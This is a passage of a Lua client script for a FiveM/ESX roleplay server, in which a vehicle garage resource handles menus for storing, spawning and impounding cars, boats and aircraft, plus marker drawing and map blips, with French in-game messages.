-------- [Base Template] dev par Freetz -------


local PlayerData = {}

local JobBlips = {}

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local userProperties = {}
local this_Garage = {}
local privateBlips = {}

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
	
	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	ESX.PlayerData = ESX.GetPlayerData()
	refreshBlips()
end)

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
	if ConfigAdvancedGarage.UsePrivateCarGarages then
		ESX.TriggerServerCallback('esx_advancedgarage:getOwnedProperties', function(properties)
			userProperties = properties
			PrivateGarageBlips()
		end)
	end
	
	ESX.PlayerData = xPlayer
	refreshBlips()
end)

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(job)
    ESX.PlayerData.job = job
	deleteBlips()
	refreshBlips()
end)

local function has_value(table, value)
	for k, v in ipairs(table) do
		if v == value then
			return true
		end
	end

	return false
end

function OpenMenuGarage(PointType)
	ESX.UI.Menu.CloseAll()
	local elements = {}
	
	if PointType == 'car_garage_point' then
		table.insert(elements, {label = _U('list_owned_cars'), value = 'list_owned_cars'})
	elseif PointType == 'boat_garage_point' then
		table.insert(elements, {label = _U('list_owned_boats'), value = 'list_owned_boats'})
	elseif PointType == 'aircraft_garage_point' then
		table.insert(elements, {label = _U('list_owned_aircrafts'), value = 'list_owned_aircrafts'})
	elseif PointType == 'car_store_point' then
		table.insert(elements, {label = _U('store_owned_cars'), value = 'store_owned_cars'})
	elseif PointType == 'boat_store_point' then
		table.insert(elements, {label = _U('store_owned_boats'), value = 'store_owned_boats'})
	elseif PointType == 'aircraft_store_point' then
		table.insert(elements, {label = _U('store_owned_aircrafts'), value = 'store_owned_aircrafts'})
	elseif PointType == 'car_pound_point' then
		table.insert(elements, {label = _U('return_owned_cars') .. ' ($' .. ConfigAdvancedGarage.CarPoundPrice .. ')', value = 'return_owned_cars'})
	elseif PointType == 'boat_pound_point' then
		table.insert(elements, {label = _U('return_owned_boats') .. ' ($' .. ConfigAdvancedGarage.BoatPoundPrice .. ')', value = 'return_owned_boats'})
	elseif PointType == 'aircraft_pound_point' then
		table.insert(elements, {label = _U('return_owned_aircrafts') .. ' ($' .. ConfigAdvancedGarage.AircraftPoundPrice .. ')', value = 'return_owned_aircrafts'})
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'garage_menu', {
		title = _U('garage'),
		align = 'top-left',
		elements = elements
	}, function(data, menu)
		menu.close()
		local action = data.current.value

		if action == 'list_owned_cars' then
			ListOwnedCarsMenu()
		elseif action == 'list_owned_boats' then
			ListOwnedBoatsMenu()
		elseif action == 'list_owned_aircrafts' then
			ListOwnedAircraftsMenu()
		elseif action == 'store_owned_cars' then
			StoreOwnedCarsMenu()
		elseif action == 'store_owned_boats' then
			StoreOwnedBoatsMenu()
		elseif action == 'store_owned_aircrafts' then
			StoreOwnedAircraftsMenu()
		elseif action == 'return_owned_cars' then
			ReturnOwnedCarsMenu()
		elseif action == 'return_owned_boats' then
			ReturnOwnedBoatsMenu()
		elseif action == 'return_owned_aircrafts' then
			ReturnOwnedAircraftsMenu()
		end
	end, function(data, menu)
	end)
end

function ListOwnedCarsMenu()
    local elements = {}
    
    ESX.TriggerServerCallback('esx_advancedgarage:getOwnedCars', function(ownedCars)
        for k, v in pairs(ownedCars) do
            local labelvehicle

            if v.state then
                labelvehicle = GetLabelText(GetDisplayNameFromVehicleModel(v.vehicle.model)) .. ' (' .. v.plate .. ') | ' .. _U('loc_garage')
            else
                labelvehicle = GetLabelText(GetDisplayNameFromVehicleModel(v.vehicle.model)) .. ' (' .. v.plate .. ') | ' .. _U('loc_pound')
            end
                    
            table.insert(elements, {label = labelvehicle, value = v})
        end
        
        ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'spawn_owned_car', {
            title = _U('garage_cars'),
            align = 'top-left',
            elements = elements
        }, function(data, menu)
            if data.current.value.state then
                menu.close()
                local vehicles = GetClosestVehicle(vector3(this_Garage.SpawnPoint.x, this_Garage.SpawnPoint.y, this_Garage.SpawnPoint.z), 3.0, 0, 71)
                if not DoesEntityExist(vehicles) then
                    SpawnVehicle(data.current.value.vehicle, data.current.value.plate)
                else
                    ESX.ShowNotification('Il y a déjà un véhicule de ~r~sorti~w~ !')
                end
            else
                ESX.ShowNotification(_U('car_is_impounded'))
            end
        end, function(data, menu)
        end)
    end)
end

function ListOwnedBoatsMenu()
	local elements = {}
	
	ESX.TriggerServerCallback('esx_advancedgarage:getOwnedBoats', function(ownedBoats)
		for k, v in pairs(ownedBoats) do
			local labelvehicle

			if v.state then
				labelvehicle = GetLabelText(GetDisplayNameFromVehicleModel(v.vehicle.model)) .. ' (' .. v.plate .. ') | ' .. _U('loc_garage')
			else
				labelvehicle = GetLabelText(GetDisplayNameFromVehicleModel(v.vehicle.model)) .. ' (' .. v.plate .. ') | ' .. _U('loc_pound')
			end
					
			table.insert(elements, {label = labelvehicle, value = v})
		end
		
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'spawn_owned_boat', {
			title = _U('garage_boats'),
			align = 'top-left',
			elements = elements
		}, function(data, menu)
			if data.current.value.state then
				menu.close()
				SpawnVehicle(data.current.value.vehicle, data.current.value.plate)
			else
				ESX.ShowNotification(_U('boat_is_impounded'))
			end
		end, function(data, menu)
		end)
	end)
end

function ListOwnedAircraftsMenu()
	local elements = {}
	
	ESX.TriggerServerCallback('esx_advancedgarage:getOwnedAircrafts', function(ownedAircrafts)
		for k, v in pairs(ownedAircrafts) do
			local labelvehicle

			if v.state then
				labelvehicle = GetLabelText(GetDisplayNameFromVehicleModel(v.vehicle.model)) .. ' (' .. v.plate .. ') | ' .. _U('loc_garage')
			else
				labelvehicle = GetLabelText(GetDisplayNameFromVehicleModel(v.vehicle.model)) .. ' (' .. v.plate .. ') | ' .. _U('loc_pound')
			end
					
			table.insert(elements, {label = labelvehicle, value = v})
		end
		
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'spawn_owned_aircraft', {
			title = _U('garage_aircrafts'),
			align = 'top-left',
			elements = elements
		}, function(data, menu)
			if data.current.value.state then
				menu.close()
				SpawnVehicle(data.current.value.vehicle, data.current.value.plate)
			else
				ESX.ShowNotification(_U('aircraft_is_impounded'))
			end
		end, function(data, menu)
		end)
	end)
end

function StoreOwnedCarsMenu()
	local playerPed = PlayerPedId()
	if IsPedInAnyVehicle(playerPed, false) then
		local vehicle = GetVehiclePedIsIn(playerPed, false)
		local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
		local engineHealth = GetVehicleEngineHealth(GetPlayersLastVehicle(playerPed, true))
		
		ESX.TriggerServerCallback('esx_advancedgarage:storeVehicle', function(valid)
			if valid then
				if engineHealth < 900 then
					if ConfigAdvancedGarage.UseDamageMult then
						reparation(math.floor((1000 - engineHealth) / 1000 * ConfigAdvancedGarage.CarPoundPrice * ConfigAdvancedGarage.DamageMult), vehicle, vehicleProps)
					else
						reparation(math.floor((1000 - engineHealth) / 1000 * ConfigAdvancedGarage.CarPoundPrice), vehicle, vehicleProps)
					end
				else
					putaway(vehicle, vehicleProps)
				end	
			else
				ESX.ShowNotification(_U('cannot_store_vehicle'))
			end
		end, vehicleProps)
	else
		ESX.ShowNotification(_U('no_vehicle_to_enter'))
	end
end

function StoreOwnedBoatsMenu()
	local playerPed = PlayerPedId()
	if IsPedInAnyVehicle(playerPed, false) then
		local vehicle = GetVehiclePedIsIn(playerPed, false)
		local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
		local engineHealth = GetVehicleEngineHealth(GetPlayersLastVehicle(playerPed, true))
		
		ESX.TriggerServerCallback('esx_advancedgarage:storeVehicle', function(valid)
			if valid then
				if engineHealth < 900 then
					if ConfigAdvancedGarage.UseDamageMult then
						reparation(math.floor((1000 - engineHealth) / 1000 * ConfigAdvancedGarage.BoatPoundPrice * ConfigAdvancedGarage.DamageMult), vehicle, vehicleProps)
					else
						reparation(math.floor((1000 - engineHealth) / 1000 * ConfigAdvancedGarage.BoatPoundPrice), vehicle, vehicleProps)
					end
				else
					putaway(vehicle, vehicleProps)
				end	
			else
				ESX.ShowNotification(_U('cannot_store_vehicle'))
			end
		end, vehicleProps)
	else
		ESX.ShowNotification(_U('no_vehicle_to_enter'))
	end
end

function StoreOwnedAircraftsMenu()
	local playerPed = PlayerPedId()
	if IsPedInAnyVehicle(playerPed, false) then
		local vehicle = GetVehiclePedIsIn(playerPed, false)
		local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
		local engineHealth = GetVehicleEngineHealth(GetPlayersLastVehicle(playerPed, true))
		
		ESX.TriggerServerCallback('esx_advancedgarage:storeVehicle', function(valid)
			if valid then
				if engineHealth < 700 then
					if ConfigAdvancedGarage.UseDamageMult then
						reparation(math.floor((1000 - engineHealth) / 1000 * ConfigAdvancedGarage.AircraftPoundPrice * ConfigAdvancedGarage.DamageMult), vehicle, vehicleProps)
					else
						reparation(math.floor((1000 - engineHealth) / 1000 * ConfigAdvancedGarage.AircraftPoundPrice), vehicle, vehicleProps)
					end
				else
					putaway(vehicle, vehicleProps)
				end	
			else
				ESX.ShowNotification(_U('cannot_store_vehicle'))
			end
		end, vehicleProps)
	else
		ESX.ShowNotification(_U('no_vehicle_to_enter'))
	end
end

function ReturnOwnedCarsMenu()
	ESX.TriggerServerCallback('esx_advancedgarage:getOutOwnedCars', function(ownedCars)
		local elements = {}

		for k, v in pairs(ownedCars) do
			table.insert(elements, {label = GetLabelText(GetDisplayNameFromVehicleModel(v.model)) .. ' (' .. v.plate .. ')', value = v})
		end
		
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'return_owned_car', {
			title = _U('pound_cars'),
			elements = elements
		}, function(data, menu)
			ESX.TriggerServerCallback('esx_advancedgarage:checkMoneyCars', function(hasEnoughMoney)
				if hasEnoughMoney then
					TriggerServerEvent('esx_advancedgarage:payCar')
					SpawnPoundedVehicle(data.current.value, data.current.value.plate)
				else
					ESX.ShowNotification(_U('not_enough_money'))
				end
			end)
		end, function(data, menu)
		end)
	end)
end

function ReturnOwnedBoatsMenu()
	ESX.TriggerServerCallback('esx_advancedgarage:getOutOwnedBoats', function(ownedBoats)
		local elements = {}

		for k, v in pairs(ownedBoats) do
			table.insert(elements, {label = GetLabelText(GetDisplayNameFromVehicleModel(v.model)) .. ' (' .. v.plate .. ')', value = v})
		end
		
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'return_owned_boat', {
			title = _U('pound_boats'),
			elements = elements
		}, function(data, menu)
			ESX.TriggerServerCallback('esx_advancedgarage:checkMoneyBoats', function(hasEnoughMoney)
				if hasEnoughMoney then
					TriggerServerEvent('esx_advancedgarage:payBoat')
					SpawnPoundedVehicle(data.current.value, data.current.value.plate)
				else
					ESX.ShowNotification(_U('not_enough_money'))
				end
			end)
		end, function(data, menu)
		end)
	end)
end

function ReturnOwnedAircraftsMenu()
	ESX.TriggerServerCallback('esx_advancedgarage:getOutOwnedAircrafts', function(ownedAircrafts)
		local elements = {}

		for k, v in pairs(ownedAircrafts) do
			table.insert(elements, {label = GetLabelText(GetDisplayNameFromVehicleModel(v.model)) .. ' (' .. v.plate .. ')', value = v})
		end
		
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'return_owned_aircraft', {
			title = _U('pound_aircrafts'),
			elements = elements
		}, function(data, menu)
			ESX.TriggerServerCallback('esx_advancedgarage:checkMoneyAircrafts', function(hasEnoughMoney)
				if hasEnoughMoney then
					TriggerServerEvent('esx_advancedgarage:payAircraft')
					SpawnPoundedVehicle(data.current.value, data.current.value.plate)
				else
					ESX.ShowNotification(_U('not_enough_money'))
				end
			end)
		end, function(data, menu)
		end)
	end)
end

--[[function reparation(apprasial, vehicle, vehicleProps)
	ESX.UI.Menu.CloseAll()
	
	local elements = {
		{label = _U('see_mechanic'), value = 'no'},
		{label = _U('return_vehicle'), rightlabel = {'$' .. apprasial}, value = 'yes'}
	}
	
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'delete_menu', {
		title = _U('damaged_vehicle'),
		elements = elements
	}, function(data, menu)
		menu.close()
		
		if data.current.value == 'yes' then
			TriggerServerEvent('esx_advancedgarage:payhealth', apprasial)
			putaway(vehicle, vehicleProps)
		elseif data.current.value == 'no' then
			ESX.ShowNotification(_U('visit_mechanic'))
		end
	end, function(data, menu)
	end)
end--]]

function reparation(apprasial, vehicle, vehicleProps)
	--ESX.ShowNotification("~r~Vous devez d\'abbord allez faire réparer votre véhicule au mécano, avant de pouvoir le ranger.")
	ESX.ShowAdvancedNotification("Réparation Nécessaire", "Parking", "~r~Vous devez d\'abord allez faire réparer votre véhicule au mécano, avant de pouvoir le ranger.", "CHAR_MOSLEY")
end 

function putaway(vehicle, vehicleProps)
	ESX.Game.DeleteVehicle(vehicle)
	TriggerServerEvent('esx_advancedgarage:setVehicleState', vehicleProps.plate, true)
	ESX.ShowNotification(_U('vehicle_in_garage'))
end

function SpawnVehicle(vehicle, plate)
	ESX.Game.SpawnVehicle(vehicle.model, {
		x = this_Garage.SpawnPoint.x,
		y = this_Garage.SpawnPoint.y,
		z = this_Garage.SpawnPoint.z + 1
	}, this_Garage.SpawnPoint.h, function(callback_vehicle)
		ESX.Game.SetVehicleProperties(callback_vehicle, vehicle)
		SetVehRadioStation(callback_vehicle, 'OFF')
		TaskWarpPedIntoVehicle(PlayerPedId(), callback_vehicle, -1)
	end)
	
	TriggerServerEvent('esx_advancedgarage:setVehicleState', plate, false)
end

function SpawnPoundedVehicle(vehicle, plate)
	ESX.Game.SpawnVehicle(vehicle.model, {
		x = this_Garage.SpawnPoint.x,
		y = this_Garage.SpawnPoint.y,
		z = this_Garage.SpawnPoint.z + 1
	}, this_Garage.SpawnPoint.h, function(callback_vehicle)
		ESX.Game.SetVehicleProperties(callback_vehicle, vehicle)
		SetVehRadioStation(callback_vehicle, 'OFF')
		TaskWarpPedIntoVehicle(PlayerPedId(), callback_vehicle, -1)
	end)
	
	TriggerServerEvent('esx_advancedgarage:setVehicleState', plate, false)
end

AddEventHandler('esx_advancedgarage:hasEnteredMarker', function(zone)
	if zone == 'car_garage_point' then
		CurrentAction = 'car_garage_point'
		CurrentActionMsg = _U('press_to_enter')
		CurrentActionData = {}
	elseif zone == 'boat_garage_point' then
		CurrentAction = 'boat_garage_point'
		CurrentActionMsg = _U('press_to_enter')
		CurrentActionData = {}
	elseif zone == 'aircraft_garage_point' then
		CurrentAction = 'aircraft_garage_point'
		CurrentActionMsg = _U('press_to_enter')
		CurrentActionData = {}
	elseif zone == 'car_store_point' then
		CurrentAction = 'car_store_point'
		CurrentActionMsg = _U('press_to_delete')
		CurrentActionData = {}
	elseif zone == 'boat_store_point' then
		CurrentAction = 'boat_store_point'
		CurrentActionMsg = _U('press_to_delete')
		CurrentActionData = {}
	elseif zone == 'aircraft_store_point' then
		CurrentAction = 'aircraft_store_point'
		CurrentActionMsg = _U('press_to_delete')
		CurrentActionData = {}
	elseif zone == 'car_pound_point' then
		CurrentAction = 'car_pound_point'
		CurrentActionMsg = _U('press_to_impound')
		CurrentActionData = {}
	elseif zone == 'boat_pound_point' then
		CurrentAction = 'boat_pound_point'
		CurrentActionMsg = _U('press_to_impound')
		CurrentActionData = {}
	elseif zone == 'aircraft_pound_point' then
		CurrentAction = 'aircraft_pound_point'
		CurrentActionMsg = _U('press_to_impound')
		CurrentActionData = {}
	end
end)

AddEventHandler('esx_advancedgarage:hasExitedMarker', function()
	ESX.UI.Menu.CloseAll()
	CurrentAction = nil
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)
		local canSleep = true
		
		if ConfigAdvancedGarage.UseCarGarages then
			for k, v in pairs(ConfigAdvancedGarage.CarGarages) do
				if (GetDistanceBetweenCoords(coords, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, true) < ConfigAdvancedGarage.DrawDistance) then
					canSleep = false
					DrawMarker(ConfigAdvancedGarage.MarkerType, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.PointMarker.x, ConfigAdvancedGarage.PointMarker.y, ConfigAdvancedGarage.PointMarker.z, ConfigAdvancedGarage.PointMarker.r, ConfigAdvancedGarage.PointMarker.g, ConfigAdvancedGarage.PointMarker.b, 100, false, true, 2, false, false, false, false)	
					DrawMarker(ConfigAdvancedGarage.MarkerType, v.DeletePoint.x, v.DeletePoint.y, v.DeletePoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.DeleteMarker.x, ConfigAdvancedGarage.DeleteMarker.y, ConfigAdvancedGarage.DeleteMarker.z, ConfigAdvancedGarage.DeleteMarker.r, ConfigAdvancedGarage.DeleteMarker.g, ConfigAdvancedGarage.DeleteMarker.b, 100, false, true, 2, false, false, false, false)
				end
			end
			
			for k, v in pairs(ConfigAdvancedGarage.CarPounds) do
				if (GetDistanceBetweenCoords(coords, v.PoundPoint.x, v.PoundPoint.y, v.PoundPoint.z, true) < ConfigAdvancedGarage.DrawDistance) then
					canSleep = false
					DrawMarker(ConfigAdvancedGarage.MarkerType, v.PoundPoint.x, v.PoundPoint.y, v.PoundPoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.PoundMarker.x, ConfigAdvancedGarage.PoundMarker.y, ConfigAdvancedGarage.PoundMarker.z, ConfigAdvancedGarage.PoundMarker.r, ConfigAdvancedGarage.PoundMarker.g, ConfigAdvancedGarage.PoundMarker.b, 100, false, true, 2, false, false, false, false)
				end
			end
		end
		
		if ConfigAdvancedGarage.UseBoatGarages then
			for k, v in pairs(ConfigAdvancedGarage.BoatGarages) do
				if (GetDistanceBetweenCoords(coords, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, true) < ConfigAdvancedGarage.DrawDistance) then
					canSleep = false
					DrawMarker(ConfigAdvancedGarage.MarkerType, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.PointMarker.x, ConfigAdvancedGarage.PointMarker.y, ConfigAdvancedGarage.PointMarker.z, ConfigAdvancedGarage.PointMarker.r, ConfigAdvancedGarage.PointMarker.g, ConfigAdvancedGarage.PointMarker.b, 100, false, true, 2, false, false, false, false)	
					DrawMarker(ConfigAdvancedGarage.MarkerType, v.DeletePoint.x, v.DeletePoint.y, v.DeletePoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.DeleteMarker.x, ConfigAdvancedGarage.DeleteMarker.y, ConfigAdvancedGarage.DeleteMarker.z, ConfigAdvancedGarage.DeleteMarker.r, ConfigAdvancedGarage.DeleteMarker.g, ConfigAdvancedGarage.DeleteMarker.b, 100, false, true, 2, false, false, false, false)	
				end
			end
			
			for k, v in pairs(ConfigAdvancedGarage.BoatPounds) do
				if (GetDistanceBetweenCoords(coords, v.PoundPoint.x, v.PoundPoint.y, v.PoundPoint.z, true) < ConfigAdvancedGarage.DrawDistance) then
					canSleep = false
					DrawMarker(ConfigAdvancedGarage.MarkerType, v.PoundPoint.x, v.PoundPoint.y, v.PoundPoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.PoundMarker.x, ConfigAdvancedGarage.PoundMarker.y, ConfigAdvancedGarage.PoundMarker.z, ConfigAdvancedGarage.PoundMarker.r, ConfigAdvancedGarage.PoundMarker.g, ConfigAdvancedGarage.PoundMarker.b, 100, false, true, 2, false, false, false, false)
				end
			end
		end
		
		if ConfigAdvancedGarage.UseAircraftGarages then
			for k, v in pairs(ConfigAdvancedGarage.AircraftGarages) do
				if (GetDistanceBetweenCoords(coords, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, true) < ConfigAdvancedGarage.DrawDistance) then
					canSleep = false
					DrawMarker(ConfigAdvancedGarage.MarkerType, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.PointMarker.x, ConfigAdvancedGarage.PointMarker.y, ConfigAdvancedGarage.PointMarker.z, ConfigAdvancedGarage.PointMarker.r, ConfigAdvancedGarage.PointMarker.g, ConfigAdvancedGarage.PointMarker.b, 100, false, true, 2, false, false, false, false)	
					DrawMarker(ConfigAdvancedGarage.MarkerType, v.DeletePoint.x, v.DeletePoint.y, v.DeletePoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.DeleteMarker.x, ConfigAdvancedGarage.DeleteMarker.y, ConfigAdvancedGarage.DeleteMarker.z, ConfigAdvancedGarage.DeleteMarker.r, ConfigAdvancedGarage.DeleteMarker.g, ConfigAdvancedGarage.DeleteMarker.b, 100, false, true, 2, false, false, false, false)	
				end
			end
			
			for k, v in pairs(ConfigAdvancedGarage.AircraftPounds) do
				if (GetDistanceBetweenCoords(coords, v.PoundPoint.x, v.PoundPoint.y, v.PoundPoint.z, true) < ConfigAdvancedGarage.DrawDistance) then
					canSleep = false
					DrawMarker(ConfigAdvancedGarage.MarkerType, v.PoundPoint.x, v.PoundPoint.y, v.PoundPoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.PoundMarker.x, ConfigAdvancedGarage.PoundMarker.y, ConfigAdvancedGarage.PoundMarker.z, ConfigAdvancedGarage.PoundMarker.r, ConfigAdvancedGarage.PoundMarker.g, ConfigAdvancedGarage.PoundMarker.b, 100, false, true, 2, false, false, false, false)
				end
			end
		end
		
		if ConfigAdvancedGarage.UsePrivateCarGarages then
			for k, v in pairs(ConfigAdvancedGarage.PrivateCarGarages) do
				if not v.Private or has_value(userProperties, v.Private) then
					if (GetDistanceBetweenCoords(coords, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, true) < ConfigAdvancedGarage.DrawDistance) then
						canSleep = false
						DrawMarker(ConfigAdvancedGarage.MarkerType, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.PointMarker.x, ConfigAdvancedGarage.PointMarker.y, ConfigAdvancedGarage.PointMarker.z, ConfigAdvancedGarage.PointMarker.r, ConfigAdvancedGarage.PointMarker.g, ConfigAdvancedGarage.PointMarker.b, 100, false, true, 2, false, false, false, false)	
						DrawMarker(ConfigAdvancedGarage.MarkerType, v.DeletePoint.x, v.DeletePoint.y, v.DeletePoint.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, ConfigAdvancedGarage.DeleteMarker.x, ConfigAdvancedGarage.DeleteMarker.y, ConfigAdvancedGarage.DeleteMarker.z, ConfigAdvancedGarage.DeleteMarker.r, ConfigAdvancedGarage.DeleteMarker.g, ConfigAdvancedGarage.DeleteMarker.b, 100, false, true, 2, false, false, false, false)	
					end
				end
			end
		end
		
		if canSleep then
			Citizen.Wait(2000)
		end
	end
end)

Citizen.CreateThread(function()
	local currentZone = 'garage'

	while true do
		Citizen.Wait(0)
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)
		local isInMarker = false
		
		if ConfigAdvancedGarage.UseCarGarages then
			for k, v in pairs(ConfigAdvancedGarage.CarGarages) do
				if (GetDistanceBetweenCoords(coords, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, true) < ConfigAdvancedGarage.PointMarker.x) then
					isInMarker = true
					this_Garage = v
					currentZone = 'car_garage_point'
				end
				
				if (GetDistanceBetweenCoords(coords, v.DeletePoint.x, v.DeletePoint.y, v.DeletePoint.z, true) < ConfigAdvancedGarage.DeleteMarker.x) then
					isInMarker = true
					this_Garage = v
					currentZone = 'car_store_point'
				end
			end
			
			for k, v in pairs(ConfigAdvancedGarage.CarPounds) do
				if (GetDistanceBetweenCoords(coords, v.PoundPoint.x, v.PoundPoint.y, v.PoundPoint.z, true) < ConfigAdvancedGarage.PoundMarker.x) then
					isInMarker = true
					this_Garage = v
					currentZone = 'car_pound_point'
				end
			end
		end
		
		if ConfigAdvancedGarage.UseBoatGarages then
			for k, v in pairs(ConfigAdvancedGarage.BoatGarages) do
				if (GetDistanceBetweenCoords(coords, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, true) < ConfigAdvancedGarage.PointMarker.x) then
					isInMarker = true
					this_Garage = v
					currentZone = 'boat_garage_point'
				end
				
				if (GetDistanceBetweenCoords(coords, v.DeletePoint.x, v.DeletePoint.y, v.DeletePoint.z, true) < ConfigAdvancedGarage.DeleteMarker.x) then
					isInMarker = true
					this_Garage = v
					currentZone = 'boat_store_point'
				end
			end
			
			for k, v in pairs(ConfigAdvancedGarage.BoatPounds) do
				if (GetDistanceBetweenCoords(coords, v.PoundPoint.x, v.PoundPoint.y, v.PoundPoint.z, true) < ConfigAdvancedGarage.PoundMarker.x) then
					isInMarker = true
					this_Garage = v
					currentZone = 'boat_pound_point'
				end
			end
		end
		
		if ConfigAdvancedGarage.UseAircraftGarages then
			for k, v in pairs(ConfigAdvancedGarage.AircraftGarages) do
				if (GetDistanceBetweenCoords(coords, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, true) < ConfigAdvancedGarage.PointMarker.x) then
					isInMarker = true
					this_Garage = v
					currentZone = 'aircraft_garage_point'
				end
				
				if (GetDistanceBetweenCoords(coords, v.DeletePoint.x, v.DeletePoint.y, v.DeletePoint.z, true) < ConfigAdvancedGarage.DeleteMarker.x) then
					isInMarker = true
					this_Garage = v
					currentZone = 'aircraft_store_point'
				end
			end
			
			for k, v in pairs(ConfigAdvancedGarage.AircraftPounds) do
				if (GetDistanceBetweenCoords(coords, v.PoundPoint.x, v.PoundPoint.y, v.PoundPoint.z, true) < ConfigAdvancedGarage.PoundMarker.x) then
					isInMarker = true
					this_Garage = v
					currentZone = 'aircraft_pound_point'
				end
			end
		end
		
		if ConfigAdvancedGarage.UsePrivateCarGarages then
			for k, v in pairs(ConfigAdvancedGarage.PrivateCarGarages) do
				if not v.Private or has_value(userProperties, v.Private) then
					if (GetDistanceBetweenCoords(coords, v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z, true) < ConfigAdvancedGarage.PointMarker.x) then
						isInMarker = true
						this_Garage = v
						currentZone = 'car_garage_point'
					end
				
					if (GetDistanceBetweenCoords(coords, v.DeletePoint.x, v.DeletePoint.y, v.DeletePoint.z, true) < ConfigAdvancedGarage.DeleteMarker.x) then
						isInMarker = true
						this_Garage = v
						currentZone = 'car_store_point'
					end
				end
			end
		end
		
		if isInMarker and not hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = true
			LastZone = currentZone
			TriggerEvent('esx_advancedgarage:hasEnteredMarker', currentZone)
		end
		
		if not isInMarker and hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = false
			TriggerEvent('esx_advancedgarage:hasExitedMarker', LastZone)
		end
		
		if not isInMarker then
			Citizen.Wait(500)
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		
		if CurrentAction ~= nil then
			ESX.ShowHelpNotification(CurrentActionMsg)
			
			if IsControlJustReleased(0, 38) then
				if CurrentAction == 'car_garage_point' then
					OpenMenuGarage('car_garage_point')
				elseif CurrentAction == 'boat_garage_point' then
					OpenMenuGarage('boat_garage_point')
				elseif CurrentAction == 'aircraft_garage_point' then
					OpenMenuGarage('aircraft_garage_point')
				elseif CurrentAction == 'car_store_point' then
					OpenMenuGarage('car_store_point')
				elseif CurrentAction == 'boat_store_point' then
					OpenMenuGarage('boat_store_point')
				elseif CurrentAction == 'aircraft_store_point' then
					OpenMenuGarage('aircraft_store_point')
				elseif CurrentAction == 'car_pound_point' then
					OpenMenuGarage('car_pound_point')
				elseif CurrentAction == 'boat_pound_point' then
					OpenMenuGarage('boat_pound_point')
				elseif CurrentAction == 'aircraft_pound_point' then
					OpenMenuGarage('aircraft_pound_point')
				end
				
				CurrentAction = nil
			end
		else
			Citizen.Wait(500)
		end
	end
end)

function PrivateGarageBlips()
	for k, v in pairs(privateBlips) do
		RemoveBlip(v)
	end
	
	privateBlips = {}
	
	for k, v in pairs(ConfigAdvancedGarage.PrivateCarGarages) do
		if v.Private and has_value(userProperties, v.Private) then
			local blip = AddBlipForCoord(v.GaragePoint.x, v.GaragePoint.y, v.GaragePoint.z)

			SetBlipSprite(blip, ConfigAdvancedGarage.BlipGaragePrivate.Sprite)
			SetBlipDisplay(blip, ConfigAdvancedGarage.BlipGaragePrivate.Display)
			SetBlipScale(blip, ConfigAdvancedGarage.BlipGaragePrivate.Scale)
			SetBlipColour(blip, ConfigAdvancedGarage.BlipGaragePrivate.Color)
			SetBlipAsShortRange(blip, true)

			BeginTextCommandSetBlipName('STRING')
			AddTextComponentSubstringPlayerName(_U('blip_garage_private'))
			EndTextCommandSetBlipName(blip)
		end
	end
end

function deleteBlips()
	if JobBlips[1] ~= nil then
		for i = 1, #JobBlips, 1 do
			RemoveBlip(JobBlips[i])
			JobBlips[i] = nil
		end
	end
end

function refreshBlips()
	local blipList = {}
	local JobBlips = {}

	if ConfigAdvancedGarage.UseCarGarages then
		for k, v in pairs(ConfigAdvancedGarage.CarGarages) do
			table.insert(blipList, {
				coords = { v.GaragePoint.x, v.GaragePoint.y },
				text = _U('blip_garage'),
				sprite = ConfigAdvancedGarage.BlipGarage.Sprite,
				color = ConfigAdvancedGarage.BlipGarage.Color,
				scale = ConfigAdvancedGarage.BlipGarage.Scale
			})
		end
		
